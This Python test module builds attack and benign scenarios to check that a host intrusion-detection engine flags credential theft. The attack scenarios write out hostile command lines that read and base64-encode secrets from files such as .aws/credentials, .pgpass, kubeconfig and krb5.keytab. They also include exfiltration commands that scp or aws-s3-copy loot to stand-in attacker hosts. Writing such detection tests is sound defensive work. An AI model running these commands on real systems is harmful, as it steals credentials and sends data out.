from __future__ import annotations
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, List, Sequence, Set

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent


@dataclass(frozen=True)
class CoverageScenario:
    name: str
    events: Sequence[NormalizedEvent]
    expected_ids: Set[str]
    forbidden_ids: Set[str]
    kind: str


@dataclass(frozen=True)
class CoverageSummary:
    total_attack: int
    detected_attack: int
    total_benign: int
    rejected_benign: int


def _proc_evt(
    ts,
    cmdline,
    *,
    host="cov-host",
    user="alice",
    process=None,
    source="journald",
    action="process_exec",
    outcome="success",
    fields=None,
    distro_family="unknown",
):
    merged_fields = {"cmdline": cmdline}
    if fields:
        merged_fields.update(fields)
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action=action,
        outcome=outcome,
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields=merged_fields,
        distro_family=distro_family,
    )


def _auth_evt(
    ts,
    *,
    action="ssh_login",
    outcome="success",
    user="alice",
    host="cov-host",
    src_ip="203.0.113.10",
    source="auth.log",
):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip=src_ip,
        source=source,
        category="auth",
        action=action,
        outcome=outcome,
        user=user,
        message=f"{action}:{outcome}",
        fields={},
    )


def collect_rule_ids(engine, events: Iterable[NormalizedEvent]) -> Set[str]:
    hits = set()
    for evt in events:
        hits.update(r.rule_id for r in engine.analyze(evt))
    return hits


def summarize_results(results: Sequence[bool], kinds: Sequence[str]) -> CoverageSummary:
    attack_total = sum(1 for kind in kinds if kind == "attack")
    benign_total = sum(1 for kind in kinds if kind == "benign")
    attack_detected = sum(1 for ok, kind in zip(results, kinds) if kind == "attack" and ok)
    benign_rejected = sum(1 for ok, kind in zip(results, kinds) if kind == "benign" and ok)
    return CoverageSummary(
        total_attack=attack_total,
        detected_attack=attack_detected,
        total_benign=benign_total,
        rejected_benign=benign_rejected,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="env-base64-read",
            events=[_proc_evt(now + 1, "cat /srv/app/.env | base64", host="cred-attack-01", process="cat")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="pgpass-grep-read",
            events=[_proc_evt(now + 2, "grep password /home/alice/.pgpass", host="cred-attack-02", process="grep")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="mycnf-copy-staging",
            events=[_proc_evt(now + 3, "cp /root/.my.cnf /tmp/mysql.cnf", host="cred-attack-03", user="root", process="cp")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="netrc-read",
            events=[_proc_evt(now + 4, "cat /root/.netrc | base64", host="cred-attack-04", user="root", process="cat")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="aws-credentials-python-read",
            events=[_proc_evt(now + 5, "python3 -c \"print(open('/home/alice/.aws/credentials').read())\"", host="cred-attack-05", process="python3")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="kubeconfig-base64-read",
            events=[_proc_evt(now + 6, "base64 /home/alice/.kube/config > /tmp/kube.b64", host="cred-attack-06", process="base64")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="docker-config-sed-read",
            events=[_proc_evt(now + 7, "sed -n '1,120p' /etc/docker/config.json", host="cred-attack-07", process="sed")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="keytab-copy",
            events=[_proc_evt(now + 8, "cp /etc/krb5.keytab /tmp/krb5.keytab", host="cred-attack-08", user="root", process="cp")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="wp-config-strings",
            events=[_proc_evt(now + 9, "strings /var/www/html/wp-config.php", host="cred-attack-09", process="strings")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="debian-apt-auth-read",
            events=[_proc_evt(now + 9.1, "cat /etc/apt/auth.conf | base64", host="cred-attack-09b", user="root", process="cat", distro_family="debian")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-rhsm-read",
            events=[_proc_evt(now + 9.2, "python3 -c \"print(open('/etc/rhsm/rhsm.conf').read())\"", host="cred-attack-09c", user="root", process="python3", distro_family="rhel")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-zypp-credentials-copy",
            events=[_proc_evt(now + 9.3, "cp /etc/zypp/credentials.d/SCCcredentials /tmp/SCCcredentials", host="cred-attack-09d", user="root", process="cp", distro_family="suse")],
            expected_ids={"PROC-CRED-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="login-aws-creds-then-scp",
            events=[
                _auth_evt(now + 10, host="cred-attack-10", user="alice"),
                _proc_evt(now + 15, "cat /home/alice/.aws/credentials", host="cred-attack-10", user="alice", process="cat"),
                _proc_evt(now + 20, "scp /tmp/loot.tgz attacker@198.51.100.80:/tmp/loot.tgz", host="cred-attack-10", user="alice", process="scp"),
            ],
            expected_ids={"SEQ-054"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="login-kubeconfig-then-temp-archive",
            events=[
                _auth_evt(now + 30, host="cred-attack-11", user="alice"),
                _proc_evt(now + 35, "cat /home/alice/.kube/config", host="cred-attack-11", user="alice", process="cat"),
                _proc_evt(now + 40, "tar czf /tmp/kube.tgz /home/alice/.kube/config", host="cred-attack-11", user="alice", process="tar"),
            ],
            expected_ids={"SEQ-054"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="login-pgpass-then-aws-s3-cp",
            events=[
                _auth_evt(now + 50, host="cred-attack-12", user="alice"),
                _proc_evt(now + 55, "cat /home/alice/.pgpass", host="cred-attack-12", user="alice", process="cat"),
                _proc_evt(now + 60, "aws s3 cp /tmp/db.tgz s3://attacker-bucket/db.tgz", host="cred-attack-12", user="alice", process="aws"),
            ],
            expected_ids={"SEQ-054"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="kubectl-config-view",
            events=[_proc_evt(now + 101, "kubectl config view --kubeconfig /home/alice/.kube/config", host="cred-benign-01", process="kubectl")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="kubectl-use-context",
            events=[_proc_evt(now + 102, "kubectl config use-context dev --kubeconfig /home/alice/.kube/config", host="cred-benign-02", process="kubectl")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-configure-profile",
            events=[_proc_evt(now + 103, "aws configure --profile admin", host="cred-benign-03", user="root", process="aws")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="mysql-defaults-file",
            events=[_proc_evt(now + 104, "mysql --defaults-file=/root/.my.cnf appdb", host="cred-benign-04", user="root", process="mysql")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="psql-passfile",
            events=[_proc_evt(now + 105, "psql service=prod passfile=/home/alice/.pgpass", host="cred-benign-05", process="psql")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="env-editor-view",
            events=[_proc_evt(now + 106, "vim /srv/app/.env", host="cred-benign-06", process="vim")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="netrc-viewer",
            events=[_proc_evt(now + 107, "less /root/.netrc", host="cred-benign-07", user="root", process="less")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="keytab-stat",
            events=[_proc_evt(now + 108, "stat /etc/krb5.keytab", host="cred-benign-08", user="root", process="stat")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="docker-login-config",
            events=[_proc_evt(now + 109, "docker login --config /home/alice/.docker/config.json registry.example.com", host="cred-benign-09", process="docker")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="ansible-kubeconfig-admin",
            events=[_proc_evt(now + 110, "ansible-playbook deploy.yml -e kubeconfig=/home/alice/.kube/config", host="cred-benign-10", user="root", process="ansible-playbook")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-apt-auth-viewer",
            events=[_proc_evt(now + 111, "less /etc/apt/auth.conf", host="cred-benign-11", user="root", process="less", distro_family="debian")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-rhsm-stat",
            events=[_proc_evt(now + 112, "stat /etc/rhsm/rhsm.conf", host="cred-benign-12", user="root", process="stat", distro_family="rhel")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-zypp-credentials-editor",
            events=[_proc_evt(now + 113, "vim /etc/zypp/credentials.d/SCCcredentials", host="cred-benign-13", user="root", process="vim", distro_family="suse")],
            expected_ids=set(),
            forbidden_ids={"PROC-CRED-001", "SEQ-054"},
            kind="benign",
        ),
    ]
